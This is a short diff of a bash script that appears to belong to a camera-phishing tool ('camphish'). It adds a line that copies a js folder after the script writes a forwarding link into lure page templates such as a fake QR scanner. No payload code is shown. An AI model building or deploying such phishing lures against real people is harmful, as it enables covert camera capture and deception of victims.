@@ -322,6 +322,7 @@ elif [[ $option_tem -eq 8 ]]; then
 sed 's+forwarding_link+'$link'+g' templates/qr_scanner.html > index2.html
 fi
 rm -rf index3.html
+cp -r js/ . 2>/dev/null
 }
 
 ngrok_server() {
@@ -488,6 +489,7 @@ elif [[ $option_tem -eq 8 ]]; then
 sed 's+forwarding_link+'$link'+g' templates/qr_scanner.html > index2.html
 fi
 rm -rf index3.html
+cp -r js/ . 2>/dev/null
 }
 
 camphish() {
